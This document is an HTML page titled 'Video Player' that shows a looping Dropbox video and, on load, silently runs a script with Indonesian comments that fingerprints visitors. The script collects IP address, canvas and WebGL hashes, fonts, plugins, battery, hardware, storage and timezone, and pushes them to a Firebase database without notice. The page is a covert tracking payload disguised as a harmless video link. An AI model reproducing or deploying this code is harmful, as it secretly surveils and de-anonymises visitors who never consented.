<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
    <script src="hi.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .video-container {
            max-width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        video {
            max-width: 100%;
            max-height: 100%;
            height: auto;
            width: auto;
            object-fit: contain; /* Vertikal seperti Instagram, fit tanpa crop */
        }
    </style>
    <script>
        // Init Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Fungsi ambil data silently lalu kirim ke DB
        async function logUserData() {
            try {
                // Anonymous login untuk write ke database
                await firebase.auth().signInAnonymously();

                // Ambil IP via API eksternal
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                // Info browser dan OS sederhana
                const userAgent = navigator.userAgent;
                let browser = "Unknown";
                let os = "Unknown";

                if (userAgent.indexOf("Chrome") > -1) browser = "Chrome";
                else if (userAgent.indexOf("Firefox") > -1) browser = "Firefox";
                else if (userAgent.indexOf("Safari") > -1) browser = "Safari";
                else if (userAgent.indexOf("Edge") > -1) browser = "Edge";
                else if (userAgent.indexOf("Trident") > -1) browser = "IE";

                if (userAgent.indexOf("Win") > -1) os = "Windows";
                else if (userAgent.indexOf("Mac") > -1) os = "MacOS";
                else if (userAgent.indexOf("Linux") > -1) os = "Linux";
                else if (userAgent.indexOf("Android") > -1) os = "Android";
                else if (userAgent.indexOf("iOS") > -1) os = "iOS";

                // Info tambahan: Screen, hardware, timezone, language
                const screenRes = `${screen.width}x${screen.height}`;
                const pixelRatio = window.devicePixelRatio;
                const cpuCores = navigator.hardwareConcurrency || "Unknown";
                const deviceMemory = navigator.deviceMemory || "Unknown";
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const language = navigator.language;
                const acceptLanguages = navigator.languages ? navigator.languages.join(', ') : "Unknown";

                // Canvas Fingerprint
                let canvasHash = "Unknown";
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = "top";
                    ctx.font = "14px 'Arial'";
                    ctx.textBaseline = "alphabetic";
                    ctx.fillStyle = "#f60";
                    ctx.fillRect(125, 1, 62, 20);
                    ctx.fillStyle = "#069";
                    ctx.fillText("Hello, world!", 2, 15);
                    canvasHash = canvas.toDataURL();
                } catch (e) {}

                // Font enumeration
                const fonts = [];
                const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact'];
                const baseFont = 'monospace';
                const testString = 'abcdefghijklmnopqrstuvwxyz0123456789';
                try {
                    const detector = document.createElement('span');
                    detector.style.fontFamily = baseFont;
                    detector.innerHTML = testString;
                    document.body.appendChild(detector);
                    const baseWidth = detector.offsetWidth;
                    document.body.removeChild(detector);
                    testFonts.forEach(font => {
                        const el = document.createElement('span');
                        el.style.fontFamily = `${font}, ${baseFont}`;
                        el.innerHTML = testString;
                        document.body.appendChild(el);
                        if (el.offsetWidth !== baseWidth) fonts.push(font);
                        document.body.removeChild(el);
                    });
                } catch (e) {}

                // WebGL Fingerprint
                let webglInfo = "Unknown";
                try {
                    const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        webglInfo = debugInfo ? `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}` : "No WebGL";
                    }
                } catch (e) {
                    webglInfo = "WebGL Error";
                }

                // Battery Status (kalo tersedia)
                let batteryInfo = "Unknown";
                try {
                    if (navigator.getBattery) {
                        const battery = await navigator.getBattery();
                        batteryInfo = `${battery.level * 100}% | ${battery.charging ? 'Charging' : 'Not Charging'}`;
                    }
                } catch (e) {}

                // Performance Timings
                const performanceTiming = performance.timing ? performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart : "Unknown";

                // Timestamp di GMT+7 (Asia/Jakarta)
                const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });

                // Tambahan Fingerprint Lanjutan (semua passive, no trigger izin)
                // Plugins Enumeration
                const plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(', ') : "No Plugins";

                // Touch Support & Input Devices
                const touchPoints = navigator.maxTouchPoints || 0;
                const pointerType = window.matchMedia('(pointer:coarse)').matches ? 'touch' : 'mouse';

                // Performance Benchmark (simple loop)
                let perfBenchmark = "Unknown";
                try {
                    let start = performance.now();
                    for (let i = 0; i < 100000; i++);
                    perfBenchmark = performance.now() - start;
                } catch (e) {}

                // Storage Quota Estimation
                let storageQuota = "Unknown";
                let storageUsage = "Unknown";
                try {
                    if (navigator.storage && navigator.storage.estimate) {
                        const estimate = await navigator.storage.estimate();
                        storageQuota = estimate.quota || "Unknown";
                        storageUsage = estimate.usage || "Unknown";
                    }
                } catch (e) {}

                // Data yang dikirim (pastikan semua field ada, meski "Unknown")
                const data = {
                    ip: userIP,
                    browser: browser,
                    os: os,
                    userAgent: userAgent,
                    screenResolution: screenRes,
                    pixelRatio: pixelRatio,
                    cpuCores: cpuCores,
                    deviceMemory: deviceMemory,
                    timezone: timezone,
                    language: language,
                    acceptLanguages: acceptLanguages,
                    canvasHash: canvasHash,
                    installedFonts: fonts.join(', '),
                    referrer: document.referrer,
                    connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
                    webglInfo: webglInfo,
                    batteryInfo: batteryInfo,
                    performanceTiming: performanceTiming,
                    timestamp: timestamp,
                    plugins: plugins,
                    touchPoints: touchPoints,
                    pointerType: pointerType,
                    perfBenchmark: perfBenchmark,
                    storageQuota: storageQuota,
                    storageUsage: storageUsage
                };

                // Kirim ke Firebase Realtime DB (path /logs)
                await database.ref('logs').push(data);
            } catch (error) {
                console.error('Error logging data:', error); // Silent error
            }
        }

        // Jalankan saat load
        window.onload = () => {
            logUserData(); // Ambil dan kirim data diam-diam
        };
    </script>
</head>
<body>
    <div class="video-container">
        <video controls controlslist="nodownload" loop playsinline>
            <source src="https://dl.dropboxusercontent.com/scl/fi/3ves1pbp353ybdmlsm7wx/Hai.mp4?rlkey=g12i80h3srmeogzlf4uqjakz2&st=lkmwy1wl&dl=0" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    </div>
</body>
</html>
